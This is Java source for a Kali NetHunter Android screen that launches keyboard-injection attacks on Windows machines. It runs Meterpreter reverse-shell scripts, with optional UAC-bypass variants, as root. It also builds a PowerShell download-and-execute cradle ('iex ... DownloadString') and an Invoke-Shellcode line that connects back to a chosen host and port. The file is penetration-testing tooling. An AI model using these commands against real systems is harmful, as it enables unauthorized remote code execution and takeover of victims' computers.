package com.offsec.nethunter;

import android.app.ActionBar;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.FragmentTransaction;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.Parcelable;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentStatePagerAdapter;
import android.support.v4.view.ViewPager;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Spinner;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

//import android.app.Fragment;
//import android.support.v4.app.FragmentActivity;

public class HidFragment extends Fragment implements ActionBar.TabListener {

    TabsPagerAdapter TabsPagerAdapter;
    ViewPager mViewPager;
    SharedPreferences sharedpreferences;
    static NhUtil nh;
    final CharSequence[] platforms = {"No UAC Bypass", "Windows 7", "Windows 8"};
    final CharSequence[] languages = {"American English", "Belgian", "British English", "Danish", "French", "German", "Italian", "Norwegian", "Portugese", "Russian", "Spanish", "Swedish"};
    private String configFilePath;

    private static final String ARG_SECTION_NUMBER = "section_number";

    public HidFragment() {

    }

    public static HidFragment newInstance(int sectionNumber) {
        HidFragment fragment = new HidFragment();
        Bundle args = new Bundle();
        args.putInt(ARG_SECTION_NUMBER, sectionNumber);
        fragment.setArguments(args);
        return fragment;
    }

    @Override
    public void onActivityCreated(Bundle savedInstanceState) {
        configFilePath =   nh.APP_SD_FILES_PATH + "/configs/powersploit-payload";
        super.onActivityCreated(savedInstanceState);
    }

    @Override
    public void onAttach(Activity activity) {
        super.onAttach(activity);
        if (isAdded()) {
            nh = new NhUtil();
        }
    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {

        View rootView = inflater.inflate(R.layout.hid, container, false);
        TabsPagerAdapter = new TabsPagerAdapter(getActivity().getSupportFragmentManager());

        mViewPager = (ViewPager) rootView.findViewById(R.id.pagerHid);
        mViewPager.setAdapter(TabsPagerAdapter);

        mViewPager.setOnPageChangeListener(new ViewPager.SimpleOnPageChangeListener() {
            @Override
            public void onPageSelected(int position) {
                getActivity().invalidateOptionsMenu();
            }
        });
        setHasOptionsMenu(true);
        sharedpreferences = getActivity().getSharedPreferences("com.offsec.nethunter", Context.MODE_PRIVATE);
        return rootView;
    }


    @Override
    public void onCreateOptionsMenu(Menu menu, MenuInflater inflater) {
        inflater.inflate(R.menu.hid, menu);
    }


    public void onPrepareOptionsMenu(Menu menu) {
        int pageNum = mViewPager.getCurrentItem();
        if (pageNum == 0) {
            menu.findItem(R.id.source_button).setVisible(true);
        } else {
            menu.findItem(R.id.source_button).setVisible(false);
        }
        getActivity().invalidateOptionsMenu();
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case R.id.start_service:
                start();
                return true;
            case R.id.stop_service:
                reset();
                return true;
            case R.id.admin:
                openDialog();
                return true;
            case R.id.chooseLanguage:
                openLanguageDialog();
                return true;
            case R.id.source_button:
                Intent i = new Intent(getActivity(), EditSourceActivity.class);
                i.putExtra("path", configFilePath);
                startActivity(i);
                return true;
            default:
                return super.onOptionsItemSelected(item);
        }
    }

    private void start() {
        int keyboardLayoutIndex = sharedpreferences.getInt("HIDKeyboardLayoutIndex", 0);
        String lang;
        switch (keyboardLayoutIndex) {
            case 1:
                lang = "be";
                break;
            case 2:
                lang = "uk";
                break;
            case 3:
                lang = "dk";
                break;
            case 4:
                lang = "fr";
                break;
            case 5:
                lang = "de";
                break;
            case 6:
                lang = "it";
                break;
            case 7:
                lang = "no";
                break;
            case 8:
                lang = "pt";
                break;
            case 9:
                lang = "ru";
                break;
            case 10:
                lang = "es";
                break;
            case 11:
                lang = "sv";
                break;
            default:
                lang = "us";
                break;
        }

        int UACBypassIndex = sharedpreferences.getInt("UACBypassIndex", 0);
        final String[] command = new String[1];
        int pageNum = mViewPager.getCurrentItem();
        if (pageNum == 0) {
            switch (UACBypassIndex) {
                case 0:
                    command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali start-rev-met --" + lang + "'";
                    break;
                case 1:
                    command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali start-rev-met-elevated-win7 --" + lang + "'";
                    break;
                default:
                    command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali start-rev-met-elevated-win8 --" + lang + "'";
                    break;
            }
        } else if (pageNum == 1) {
            switch (UACBypassIndex) {
                case 0:
                    command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali hid-cmd --" + lang + "'";
                    break;
                case 1:
                    command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali hid-cmd-elevated-win7 --" + lang + "'";
                    break;
                default:
                    command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali hid-cmd-elevated-win8 --" + lang + "'";
                    break;
            }
        }
        nh.showMessage("Attack launched...");
        new Thread(new Runnable() {
            public void run() {
                ShellExecuter exe = new ShellExecuter();
                exe.RunAsRoot(command);
                //Logger.appendLog(outp1);
                mViewPager.post(new Runnable() {
                    @Override
                    public void run() {

                        nh.showMessage("Attack execution ended.");
                    }
                });
            }

        }).start();
    }

    private void reset() {
        ShellExecuter exe = new ShellExecuter();
        String[] command = {"stop-badusb"};
        exe.RunAsRoot(command);
        nh.showMessage("Reseting USB");
    }


    public void openDialog() {

        int UACBypassIndex = sharedpreferences.getInt("UACBypassIndex", 0);
        AlertDialog.Builder builder = new AlertDialog.Builder(getActivity());
        builder.setTitle("UAC Bypass:");
        builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {

            @Override
            public void onClick(DialogInterface dialog, int which) {
            }
        });

        builder.setSingleChoiceItems(platforms, UACBypassIndex, new DialogInterface.OnClickListener() {

            @Override
            public void onClick(DialogInterface dialog, int which) {
                Editor editor = sharedpreferences.edit();
                editor.putInt("UACBypassIndex", which);
                editor.commit();
            }
        });
        builder.show();
    }

    public void openLanguageDialog() {

        int keyboardLayoutIndex = sharedpreferences.getInt("HIDKeyboardLayoutIndex", 0);

        AlertDialog.Builder builder = new AlertDialog.Builder(getActivity());
        builder.setTitle("Keyboard Layout:");
        builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {

            @Override
            public void onClick(DialogInterface dialog, int which) {

            }
        });

        builder.setSingleChoiceItems(languages, keyboardLayoutIndex, new DialogInterface.OnClickListener() {

            @Override
            public void onClick(DialogInterface dialog, int which) {
                Editor editor = sharedpreferences.edit();
                editor.putInt("HIDKeyboardLayoutIndex", which);
                editor.commit();
            }
        });
        builder.show();
    }

    @Override
    public void onTabUnselected(ActionBar.Tab tab, FragmentTransaction fragmentTransaction) {

    }

    @Override
    public void onTabSelected(ActionBar.Tab tab, FragmentTransaction fragmentTransaction) {
        mViewPager.setCurrentItem(tab.getPosition());
    }

    @Override
    public void onTabReselected(ActionBar.Tab tab, FragmentTransaction fragmentTransaction) {

    }


    //public static class TabsPagerAdapter extends FragmentPagerAdapter {
    public static class TabsPagerAdapter extends FragmentStatePagerAdapter {


        public TabsPagerAdapter(FragmentManager fm) {
            super(fm);
        }

        @Override
        public Fragment getItem(int i) {
            switch (i) {
                case 0:
                    return new PowerSploitFragment();
                default:
                    return new WindowsCmdFragment();
            }
        }

        @Override
        public Parcelable saveState() {
            return null;
        }

        @Override
        public int getCount() {
            return 2;
        }

        @Override
        public CharSequence getPageTitle(int position) {
            switch (position) {
                case 1:
                    return "Windows CMD";
                default:
                    return "PowerSploit";
            }
        }
    }

    public static class PowerSploitFragment extends Fragment implements OnClickListener {

        private String configFilePath =  "/configs/powersploit-payload";
        private String configFileUrlPath = "/configs/powersploit-url";

        @Override
        public void onActivityCreated(Bundle savedInstanceState) {

            super.onActivityCreated(savedInstanceState);
        }

        @Override
        public View onCreateView(LayoutInflater inflater, ViewGroup container,
                                 Bundle savedInstanceState) {
            View rootView = inflater.inflate(R.layout.hid_powersploit, container, false);
            Button b = (Button) rootView.findViewById(R.id.powersploitOptionsUpdate);
            b.setOnClickListener(this);
            return rootView;
        }

        @Override
        public void onResume() {
            super.onResume();
            loadOptions();
        }

        public void onClick(View v) {
            switch (v.getId()) {
                case R.id.powersploitOptionsUpdate:
                    try {

                        File myFile = new File(nh.APP_SD_FILES_PATH, configFileUrlPath);
                        myFile.createNewFile();
                        FileOutputStream fOut = new FileOutputStream(myFile);
                        OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut);
                        EditText newPayloadUrl = (EditText) getView().getRootView().findViewById(R.id.payloadUrl);

                        String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\")";
                        myOutWriter.append(newText);
                        myOutWriter.close();
                        fOut.close();
                    } catch (Exception e) {
                        nh.showMessage(e.getMessage());
                        return;
                    }


                    EditText ip = (EditText) getView().findViewById(R.id.ipaddress);
                    EditText port = (EditText) getView().findViewById(R.id.port);

                    Spinner payload = (Spinner) getView().findViewById(R.id.payload);
                    String payloadValue = payload.getSelectedItem().toString();

                    String newString = "Invoke-Shellcode -Payload " + payloadValue + " -Lhost " + ip.getText() + " -Lport " + port.getText() + " -Force";


                    ShellExecuter exe = new ShellExecuter();
                    String source = exe.ReadFile_SYNC(nh.APP_SD_FILES_PATH + configFilePath);

                    String regExPat = "^Invoke-Shellcode -Payload(.*)$";
                    Pattern pattern = Pattern.compile(regExPat, Pattern.MULTILINE);
                    Matcher matcher = pattern.matcher(source);
                    // NEVER MATCH?
                    if (matcher.find()) {
                        source = source.replace(matcher.group(0), newString);
                        exe.SaveFileContents(source, nh.APP_SD_FILES_PATH + configFilePath);
                        nh.showMessage("Options updated!");
                    } else {
                        nh.showMessage("Options not updated!");
                    }
                    break;
                default:
                    nh.showMessage("Unknown click");
                    break;
            }
        }
        private void loadOptions() {
            final EditText payloadUrl = (EditText) getView().findViewById(R.id.payloadUrl);
            final EditText port = (EditText) getView().findViewById(R.id.port);
            final Spinner payload = (Spinner) getView().findViewById(R.id.payload);
            final ShellExecuter exe = new ShellExecuter();

            new Thread(new Runnable() {
                public void run() {
                    final String textUrl = exe.ReadFile_SYNC(nh.APP_SD_FILES_PATH + configFileUrlPath);
                    final String text = exe.ReadFile_SYNC(nh.APP_SD_FILES_PATH + configFilePath);
                    String regExPatPayloadUrl = "DownloadString\\(\"(.*)\"\\)";
                    Pattern patternPayloadUrl = Pattern.compile(regExPatPayloadUrl, Pattern.MULTILINE);
                    final Matcher matcherPayloadUrl = patternPayloadUrl.matcher(textUrl);

                    String[] lines = text.split("\n");
                    final String line = lines[lines.length - 1];

                    String regExPatIp = "-Lhost\\ (.*)\\ -Lport";
                    Pattern patternIp = Pattern.compile(regExPatIp, Pattern.MULTILINE);
                    final Matcher matcherIp = patternIp.matcher(line);

                    String regExPatPort = "-Lport\\ (.*)\\ -Force";
                    Pattern patternPort = Pattern.compile(regExPatPort, Pattern.MULTILINE);
                    final Matcher matcherPort = patternPort.matcher(line);

                    String regExPatPayload = "-Payload\\ (.*)\\ -Lhost";
                    Pattern patternPayload = Pattern.compile(regExPatPayload, Pattern.MULTILINE);
                    final Matcher matcherPayload = patternPayload.matcher(line);

                    payloadUrl.post(new Runnable() {
                        @Override
                        public void run() {

                            if (matcherPayloadUrl.find()) {
                                String payloadUrlValue = matcherPayloadUrl.group(1);
                                payloadUrl.setText(payloadUrlValue);
                            }

                            if (matcherIp.find()) {
                                String ipValue = matcherIp.group(1);
                                EditText ip = (EditText) getView().findViewById(R.id.ipaddress);
                                ip.setText(ipValue);
                            }

                            if (matcherPort.find()) {
                                String portValue = matcherPort.group(1);
                                port.setText(portValue);
                            }

                            if (matcherPayload.find()) {
                                String payloadValue = matcherPayload.group(1);
                                ArrayAdapter myAdap = (ArrayAdapter) payload.getAdapter();
                                int spinnerPosition;
                                spinnerPosition = myAdap.getPosition(payloadValue);
                                payload.setSelection(spinnerPosition);
                            }
                        }
                    });
                }
            }).start();
        }
    }


    public static class WindowsCmdFragment extends Fragment implements OnClickListener {

        private String configFilePath;
        private String loadFilePath = "/scripts/hid/";

        @Override
        public void onActivityCreated(Bundle savedInstanceState) {
            configFilePath = "/configs/hid-cmd.conf";
            EditText source = (EditText)getActivity().findViewById(R.id.windowsCmdSource);
            File file = new File(nh.APP_SD_FILES_PATH, configFilePath);
            StringBuilder text = new StringBuilder();
            try {
                BufferedReader br = new BufferedReader(new FileReader(file));
                String line;
                while ((line = br.readLine()) != null) {
                    text.append(line);
                    text.append('\n');
                }
                br.close();
            } catch (IOException e) {
                Log.e("Nethunter", "exception", e);
            }
            source.setText(text);
            super.onActivityCreated(savedInstanceState);
        }

        @Override
        public View onCreateView(LayoutInflater inflater, ViewGroup container,
                                 Bundle savedInstanceState) {
            View rootView = inflater.inflate(R.layout.hid_windows_cmd, container, false);
            Button b = (Button) rootView.findViewById(R.id.windowsCmdUpdate);
            Button b1 = (Button) rootView.findViewById(R.id.windowsCmdLoad);
            Button b2 = (Button) rootView.findViewById(R.id.windowsCmdSave);
            b.setOnClickListener(this);
            b1.setOnClickListener(this);
            b2.setOnClickListener(this);
            return rootView;
        }

        private static final int PICKFILE_RESULT_CODE = 1;

        public void onClick(View v) {
            switch (v.getId()) {
                case R.id.windowsCmdUpdate:
                    EditText source = (EditText) getView().findViewById(R.id.windowsCmdSource);
                    String text = source.getText().toString();
                    try {
                        File myFile = new File(nh.APP_SD_FILES_PATH, configFilePath);
                        myFile.createNewFile();
                        FileOutputStream fOut = new FileOutputStream(myFile);
                        OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut);
                        myOutWriter.append(text);
                        myOutWriter.close();
                        fOut.close();
                        nh.showMessage("Source updated");
                    } catch (Exception e) {
                        nh.showMessage(e.getMessage());
                    }
                    break;
                case R.id.windowsCmdLoad:
                    try {

                        File scriptsDir = new File(nh.APP_SD_FILES_PATH,loadFilePath);
                        if(!scriptsDir.exists()) scriptsDir.mkdirs();
                    } catch (Exception e) {
                        nh.showMessage(e.getMessage());
                    }
                    Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
                    Uri selectedUri = Uri.parse(nh.APP_SD_FILES_PATH + loadFilePath);
                    intent.setDataAndType(selectedUri, "file/*");
                    startActivityForResult(intent, PICKFILE_RESULT_CODE);
                    break;
                case R.id.windowsCmdSave:
					 try {

                        File scriptsDir = new File(nh.APP_SD_FILES_PATH,loadFilePath);
                        if(!scriptsDir.exists()) scriptsDir.mkdirs();
                    } catch (Exception e) {
                         nh.showMessage(e.getMessage());
                    }
                    AlertDialog.Builder alert = new AlertDialog.Builder(getActivity());

                    alert.setTitle("Name");
                    alert.setMessage("Please enter a name for your script.");

                    // Set an EditText view to get user input
                    final EditText input = new EditText(getActivity());
                    alert.setView(input);

                    alert.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
                        public void onClick(DialogInterface dialog, int whichButton) {
                            String value = input.getText().toString();
                            if(!value.equals("") && value.length() >0){
                            //FIXME Save file (ask name)
                                File scriptFile = new File(nh.APP_SD_FILES_PATH + loadFilePath + File.separator +  value +".conf");
                                System.out.println(scriptFile.getAbsolutePath());
                                if(!scriptFile.exists()){
                                    try {
                                        EditText source = (EditText) getView().findViewById(R.id.windowsCmdSource);
                                        String text = source.getText().toString();
                                        scriptFile.createNewFile();
                                        FileOutputStream fOut = new FileOutputStream(scriptFile);
                                        OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut);
                                        myOutWriter.append(text);
                                        myOutWriter.close();
                                        fOut.close();
                                        nh.showMessage("Script saved");
                                    } catch (Exception e) {
                                        nh.showMessage(e.getMessage());
                                    }
                                }else{
                                    nh.showMessage("File already exists");
                                }
                            }else{
                                nh.showMessage("Wrong name provided");
                            }
                        }
                    });

                    alert.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                        public void onClick(DialogInterface dialog, int whichButton) {
                           ///Do nothing
                        }
                        });
                    alert.show();
                    break;
                default:
                    nh.showMessage("Unknown click");
                    break;
            }
        }

        @Override
        public void onActivityResult(int requestCode, int resultCode, Intent data) {
            switch (requestCode) {
                case PICKFILE_RESULT_CODE:
                    if (resultCode == Activity.RESULT_OK) {
                        String FilePath = data.getData().getPath();
                        EditText source = (EditText) getView().findViewById(R.id.windowsCmdSource);
                        try {
                            String text = "";
                            BufferedReader br = new BufferedReader(new FileReader(FilePath));
                            String line;
                            while ((line = br.readLine()) != null) {
                                text += line + '\n';
                            }
                            br.close();
                            source.setText(text);
                            nh.showMessage("Script loaded");
                        } catch (Exception e) {
                            nh.showMessage(e.getMessage());
                        }
                        break;
                    }
                    break;

            }
        }
    }
}
